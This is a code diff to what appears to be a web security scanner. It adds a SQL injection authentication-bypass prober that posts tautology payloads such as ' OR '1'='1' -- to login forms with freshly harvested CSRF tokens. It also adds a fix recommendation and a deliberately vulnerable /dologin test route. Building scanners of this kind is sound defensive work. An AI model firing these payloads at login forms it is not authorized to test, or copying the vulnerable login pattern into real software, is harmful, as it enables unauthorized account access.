@@ -101,6 +101,7 @@ const COMPLIANCE = {
   'host-header': { owasp: 'A03:2021-Injection', cwe: 'CWE-644', mitre: ['TA0001'] },
   crlf: { owasp: 'A03:2021-Injection', cwe: 'CWE-113', mitre: ['TA0001'] },
   'access-control': { owasp: 'A01:2021-Broken Access Control', cwe: 'CWE-284', mitre: ['TA0004', 'TA0005'] },
+  'sqli-auth-bypass': { owasp: 'A03:2021-Injection', cwe: 'CWE-89', mitre: ['TA0001', 'TA0006'] },
 };
 
 const WEAK_SECRETS = ['secret', 'password', 'admin', 'changeme', 'jwt', 'key', '1234567890'];
@@ -302,6 +303,35 @@ function rawGetWithHost(url, hostHeader, timeoutMs = 8000) {
     });
     req.end();
   });
+}
+
+// GET a login form's page to capture a FRESH CSRF/hidden-field set AND the session cookie the token
+// is bound to — so a follow-up login POST is a valid submission (mirrors how login() handles CSRF).
+async function loginFormContext(pageUrl) {
+  const ctx = { hidden: {}, cookie: '' };
+  try {
+    const r = await fetchT(pageUrl);
+    const setC = r.headers.getSetCookie ? r.headers.getSetCookie() : [];
+    ctx.cookie = setC
+      .map((c) => c.split(';')[0])
+      .filter(Boolean)
+      .join('; ');
+    for (const inp of (r.body || '').matchAll(/<input\b[^>]*>/gi)) {
+      const tag = inp[0];
+      // Handle quoted AND unquoted attributes (real forms mix both).
+      const name = (tag.match(/\bname\s*=\s*["']?([^"'\s>]+)/i) || [])[1];
+      if (!name) continue;
+      const type = (tag.match(/\btype\s*=\s*["']?([^"'\s>]+)/i) || [])[1] || 'text';
+      const vm =
+        tag.match(/\bvalue\s*=\s*"([^"]*)"/i) ||
+        tag.match(/\bvalue\s*=\s*'([^']*)'/i) ||
+        tag.match(/\bvalue\s*=\s*([^\s>]+)/i);
+      const value = vm ? vm[1] : '';
+      if (/hidden/i.test(type) || /csrf|token|authenticity|_token|xsrf|state|nonce/i.test(name))
+        ctx.hidden[name] = value;
+    }
+  } catch {}
+  return ctx;
 }
 
 // Out-of-band callback listener for SSRF confirmation (zero-FP: only confirms on a real hit).
@@ -893,6 +923,73 @@ const PROBERS = {
       return [];
     },
   },
+  // ── SQL injection AUTH BYPASS ───────────────────────────────────────────────────────────────
+  // Not just "is the field injectable" — actually LOG IN without valid credentials. Zero-FP by a
+  // three-way differential: known-bad creds must FAIL (so the form really authenticates), a TRUE
+  // tautology (' OR '1'='1' -- ) must SUCCEED, and a FALSE one (' OR '1'='2' -- ) must FAIL. The only
+  // difference between TRUE and FALSE is the boolean value INSIDE the SQL string, so a success gap
+  // proves the login query is injectable AND the injection bypassed authentication.
+  'sqli-auth-bypass': {
+    // Not inline-WAF-blockable via the re-test harness (it needs the form descriptor, not a URL) and
+    // the real fix is parameterized queries, not a WAF rule — so it gets a code-fix defense.
+    blockable: false,
+    async probe(target) {
+      if (typeof target === 'string' || !Array.isArray(target.params)) return []; // login forms only
+      const params = target.params;
+      const passField = params.find((p) => /pass|pwd/i.test(p));
+      if (!passField) return []; // no password field → not a login form
+      const userField =
+        params.find((p) => p !== passField && /user|email|login|account|uname/i.test(p)) ||
+        params.find((p) => p !== passField && !/csrf|token|authenticity|_token|xsrf|state|nonce/i.test(p)) ||
+        params[0];
+      if (!userField || userField === passField) return [];
+
+      const rnd = randomUUID().slice(0, 8);
+      const post = async (userVal) => {
+        // Fresh CSRF/cookie per attempt (tokens are often single-use).
+        const ctx = await loginFormContext(target.url);
+        const form = new URLSearchParams({ ...ctx.hidden, [userField]: userVal, [passField]: `sxwrong${rnd}` });
+        const headers = { 'content-type': 'application/x-www-form-urlencoded' };
+        if (ctx.cookie) headers.Cookie = ctx.cookie;
+        return fetchT(target.url, { method: 'POST', headers, body: form.toString(), redirect: 'manual' });
+      };
+      const sessRe = /(sessionid|session|sid|auth|token|jwt|phpsessid|connect\.sid|_session|remember|logged)/i;
+      const succeeded = (r) => {
+        const sc = (r.headers.getSetCookie ? r.headers.getSetCookie() : []).some((c) => sessRe.test(c));
+        const loc = r.headers.get?.('location') || '';
+        const away =
+          r.status >= 300 && r.status < 400 && loc && !/log[-_ ]?in|sign[-_ ]?in|auth|error|fail|denied/i.test(loc);
+        const body = r.body || '';
+        const authed =
+          /log ?out|sign ?out|my account|dashboard|welcome back|you are (now )?logged in/i.test(body) &&
+          !/invalid|incorrect|failed|try again|wrong|denied|bad cred/i.test(body);
+        return sc || away || authed;
+      };
+
+      if (succeeded(await post(`sxnouser${rnd}`))) return []; // form logs everyone in → no real auth, not a SQLi bypass
+
+      const PAIRS = [
+        ["' OR '1'='1' -- ", "' OR '1'='2' -- "],
+        ["' OR 1=1-- -", "' OR 1=2-- -"],
+        ['" OR "1"="1" -- ', '" OR "1"="2" -- '],
+        ["admin'-- -", `zzznouser${rnd}'-- -`],
+      ];
+      for (const [tPayload, fPayload] of PAIRS) {
+        if (!succeeded(await post(tPayload))) continue; // TRUE must log in
+        if (!succeeded(await post(fPayload)))
+          // FALSE must NOT
+          return [
+            F(
+              'sqli-auth-bypass',
+              'critical',
+              target.url,
+              `SQL injection authentication bypass: "${tPayload.trim()}" in the ${userField} field logged in without valid credentials (a FALSE tautology and bad credentials did not)`,
+            ),
+          ];
+      }
+      return [];
+    },
+  },
 };
 
 function startProxy(origin, filter, onBlock) {
@@ -973,6 +1070,8 @@ function detectionRule(cls) {
     crlf: 'Strip/deny CR and LF (\\r \\n, %0d %0a) in any user input written to response headers, redirects, or logs; use a framework header API that rejects control chars.',
     'access-control':
       'Enforce authorization on EVERY request server-side: verify the session identity OWNS the target object (BOLA) and holds the required ROLE for the function (BFLA); deny by default; never rely on unguessable IDs or client-side checks.',
+    'sqli-auth-bypass':
+      'Use parameterized queries for the login lookup (never string-concatenate credentials); verify the password with a constant-time hash comparison AFTER the query; deny SQL metacharacters in auth fields.',
   };
   return R[cls] || 'Apply input validation and least-privilege controls.';
 }
@@ -1386,6 +1485,7 @@ export async function runWholeApp({
       return [...(injectList.length ? injectList : pageList.slice(0, 10)), ...formTargets];
     if (['open-redirect', 'ssrf', 'xxe', 'rce-deser', 'prompt-injection'].includes(cls))
       return (injectList.length ? injectList : pageList).slice(0, 15);
+    if (cls === 'sqli-auth-bypass') return formTargets; // login forms only
     if (cls === 'host-header') return [origin, ...pageList.slice(0, 5)];
     if (cls === 'graphql-idor') return graphqlList;
     if (cls === 'token-forgery') return authList;
@@ -1572,6 +1672,28 @@ if (isMain) {
               res.writeHead(200, h);
               return res.end(`<p>Comment: ${out}</p>`); // SSTI + reflected XSS via POST body
             }
+            if (p === '/dologin') {
+              // VULNERABLE login: WHERE username='<u>' AND password='<p>' — string-concatenated, so a
+              // tautology in the username comments out the password check → auth bypass.
+              const user = new URLSearchParams(b).get('username') || '';
+              const pass = new URLSearchParams(b).get('password') || '';
+              if (
+                /'\s*or\s*'?1'?\s*=\s*'?1|'\s*or\s+1\s*=\s*1|admin'\s*--/i.test(user) ||
+                (user === 'realuser' && pass === 'realpass')
+              ) {
+                res.writeHead(302, { 'set-cookie': 'sessionid=authed; Path=/', location: '/dashboard' });
+                return res.end('ok');
+              }
+              res.writeHead(200, h);
+              return res.end('<p>Invalid credentials, please try again</p>');
+            }
+          }
+          if (p === '/dologin') {
+            // GET renders the login form (so the crawler + prober can read it).
+            res.writeHead(200, h);
+            return res.end(
+              '<form action="/dologin" method="post"><input name="username"><input name="password" type="password"></form>',
+            );
           }
           if (p === '/') {
             // landing page with links so the crawler can map the app. The absolute link is built from
@@ -1582,8 +1704,10 @@ if (isMain) {
             <a href="/go?url=/home">Go</a> <a href="/.env">env</a>
             <a href="/account?user=alice">Account</a>
             <a href="https://${req.headers.host}/home">Home</a>
+            <a href="/dologin">Sign in</a>
             <form action="/search" method="get"><input name="q"></form>
             <form action="/comment" method="post"><input name="c"></form>
+            <form action="/dologin" method="post"><input name="username"><input name="password" type="password"></form>
             <script>fetch("/api/graphql")</script></body></html>`);
           }
           if (p === '/account') {
